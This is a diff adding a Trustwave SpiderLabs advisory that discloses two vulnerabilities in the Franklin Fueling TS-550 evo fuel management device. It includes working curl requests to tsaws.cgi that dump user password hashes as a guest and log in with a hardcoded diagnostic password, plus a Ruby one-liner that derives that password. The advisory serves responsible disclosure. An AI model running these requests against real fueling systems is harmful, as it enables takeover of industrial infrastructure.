@@ -1,0 +1,127 @@
+Trustwave's SpiderLabs Security Advisory TWSL2014-001:
+Multiple Vulnerabilities in Franklin Fueling's TS-550 evo
+
+Published: 01/03/2014
+Version: 1.0
+
+Vendor: Franklin Fueling Systems (http://www.franklinfueling.com/)
+Product: TS-550 evo device
+Version affected:  Firmware 2.0.0.6833 confirmed.  Affects prior to version
+2.4.0
+
+Product description:
+A fuel management system with a programmable interface used for inventory
+and delivery management.
+
+Finding 1: Insufficient Access Control
+Credit: Nate Drier and Matt Jakubowski of Trustwave SpiderLabs
+CVE: CVE-2013-7247
+CWE: CWE-200
+
+As the Guest user (the lowest privilege), a user can post the
+cmdWebGetConfiguration parameter to cgi-bin/tsaws.cgi. This will return the
+usernames and password hashes (in DES format) for all users of the
+application. Once dumped, they can be cracked and used to access
+authenticated portions of the application.
+
+
+#Request
+
+curl -H "Content-Type:text/xml" --data '<TSA_REQUEST_LIST><TSA_REQUEST COMMAND="cmdWebGetConfiguration"/></TSA_REQUEST_LIST>' http://<ip>:10001/cgi-bin/tsaws.cgi
+
+#Response
+
+<TSA_RESPONSE_LIST VERSION="2.0.0.6833" TIME_STAMP="2013-02-19T22:09:22Z" TIME_STAMP_LOCAL="2013-02-19T17:09:22" KEY="11111111" ROLE="roleGuest"><TSA_RESPONSE COMMAND="cmdWebGetConfiguration"><CONFIGURATION>
+    <DEBUGGING LOGGING_ENABLED="false" LOGGING_PATH="/tmp"/>
+    <ROLE_LIST>
+        <ROLE NAME="roleAdmin" PASSWORD="YrKMc2T2BuGvQ"/>
+        <ROLE NAME="roleUser" PASSWORD="2wd2DlEKUPTr2"/>
+        <ROLE NAME="roleGuest" PASSWORD="YXFCsq2GXFQV2"/>
+    </ROLE_LIST>
+</CONFIGURATION></TSA_RESPONSE></TSA_RESPONSE_LIST>
+
+Finding 2: Hardcoded Technician Credentials
+Credit: Nate Drier and Matt Jakubowski of Trustwave SpiderLabs
+CVE: CVE-2013-7248
+CWE: CWE-798
+
+The three primary users on the TS550 are roleGuest, roleUser, and
+roleAdmin.  Another user exists with additional access named roleDiag. This
+user can access extra portions of the application such as the command line
+interface, enable and disable SSH, as well as run SQL commands all from the
+web interface.  The CLI interface includes the ability to run engineering
+and manufacturing commands.  The password for roleDiag is the key (a value
+returned with every POST request to tsaws.cgi) DES encrypted.  This can be
+done in Ruby:
+
+
+$ irb
+1.9.3p374 :001 > "11111111".crypt("aa")
+ => "aaDTlAa1fGGC."
+
+#Request
+
+curl -H "Content-Type:text/xml" --data '<TSA_REQUEST_LIST PASSWORD="aaDTlAa1fGGC."><TSA_REQUEST COMMAND="cmdWebCheckRole"/></TSA_REQUEST_LIST>' http://<ip>:10001/cgi-bin/tsaws.cgi
+
+#Response (note the ROLE)
+
+<TSA_RESPONSE_LIST VERSION="2.0.0.6833" TIME_STAMP="2013-03-04T16:53:01Z" TIME_STAMP_LOCAL="2013-03-04T11:53:01" KEY="11111111" ROLE="roleDiag"><TSA_RESPONSE COMMAND="cmdWebCheckRole"></TSA_RESPONSE></TSA_RESPONSE_LIST>
+
+The password can then be used to run various roleDiag commands. An attacker
+can enable SSH, and since root's password is the same as roleAdmin, they
+can completely compromise the device.
+
+Remediation Steps:
+According to Franklin Fueling, version 2.4.0 mitigates these
+vulnerabilities. However, Trustwave SpiderLabs have not verified this fix.
+
+
+Revision History:
+04/16/13 - Vulnerability disclosed to vendor
+12/18/13 - Fix released on a limited basis by vendor
+01/03/14 - Advisory published
+
+References
+1. http://www.franklinfueling.com/evo/
+
+
+About Trustwave:
+Trustwave is the leading provider of on-demand and subscription-based
+information security and payment card industry compliance management
+solutions to businesses and government entities throughout the world. For
+organizations faced with today's challenging data security and compliance
+environment, Trustwave provides a unique approach with comprehensive
+solutions that include its flagship TrustKeeper compliance management
+software and other proprietary security solutions. Trustwave has helped
+thousands of organizations--ranging from Fortune 500 businesses and large
+financial institutions to small and medium-sized retailers--manage
+compliance and secure their network infrastructure, data communications and
+critical information assets. Trustwave is headquartered in Chicago with
+offices throughout North America, South America, Europe, Africa, China and
+Australia. For more information, visit https://www.trustwave.com
+
+About Trustwave's SpiderLabs:
+SpiderLabs(R) is the advanced security team at Trustwave focused on
+application security, incident response, penetration testing, physical
+security and security research. The team has performed over a thousand
+incident investigations, thousands of penetration tests and hundreds of
+application security tests globally. In addition, the SpiderLabs Research
+team provides intelligence through bleeding-edge research and proof of
+concept tool development to enhance Trustwave's products and services.
+https://www.trustwave.com/spiderlabs
+
+Disclaimer:
+The information provided in this advisory is provided "as is" without
+warranty of any kind. Trustwave disclaims all warranties, either express or
+implied, including the warranties of merchantability and fitness for a
+particular purpose. In no event shall Trustwave or its suppliers be liable
+for any damages whatsoever including direct, indirect, incidental,
+consequential, loss of business profits or special damages, even if
+Trustwave or its suppliers have been advised of the possibility of such
+damages. Some states do not allow the exclusion or limitation of liability
+for consequential or incidental damages so the foregoing limitation may not
+apply.
+
+________________________________
+
+This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.
